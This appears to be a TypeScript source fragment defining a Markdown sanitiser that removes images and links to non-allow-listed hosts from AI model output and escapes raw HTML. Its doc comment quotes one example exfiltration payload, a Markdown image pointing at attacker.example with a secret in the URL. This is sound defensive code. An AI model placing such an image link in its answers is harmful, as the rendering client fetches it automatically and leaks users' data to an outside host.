// #region output
/**
 * Model output is untrusted input to whatever renders it. Two classic
 * failures: raw HTML executing in the browser, and Markdown images or links
 * that exfiltrate data, e.g. ![x](https://attacker.example/p?d=<secret>),
 * which the client fetches automatically when it renders the answer.
 */
export function sanitizeMarkdown(md: string, allowedHosts: string[]): { text: string; removed: string[] } {
  const removed: string[] = [];
  const allowed = (url: string) => {
    try {
      const u = new URL(url);
      return u.protocol === 'https:' && allowedHosts.some((h) => u.hostname === h || u.hostname.endsWith(`.${h}`));
    } catch {
      return false; // relative or malformed: not allowed
    }
  };
  let text = md
    // Images: drop entirely unless the host is allowed (they load without a click).
    .replace(/!\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+"[^"]*")?\s*\)/g, (m, alt: string, url: string) => {
      if (allowed(url)) return m;
      removed.push(url);
      return alt ? `[image removed: ${alt}]` : '[image removed]';
    })
    // Links: keep the text, drop the target unless allowed.
    .replace(/\[([^\]]+)\]\(\s*<?([^)\s>]+)>?(?:\s+"[^"]*")?\s*\)/g, (m, label: string, url: string) => {
      if (allowed(url)) return m;
      removed.push(url);
      return label;
    })
    // Reference-style definitions can smuggle URLs past the inline rules.
    .replace(/^\s*\[[^\]]+\]:\s*(\S+).*$/gm, (m, url: string) => {
      if (allowed(url)) return m;
      removed.push(url);
      return '';
    });
  // Raw HTML is neutralised by escaping "<"; ">" stays so Markdown quotes still work.
  text = text.replace(/</g, '&lt;');
  return { text, removed };
}
// #endregion output
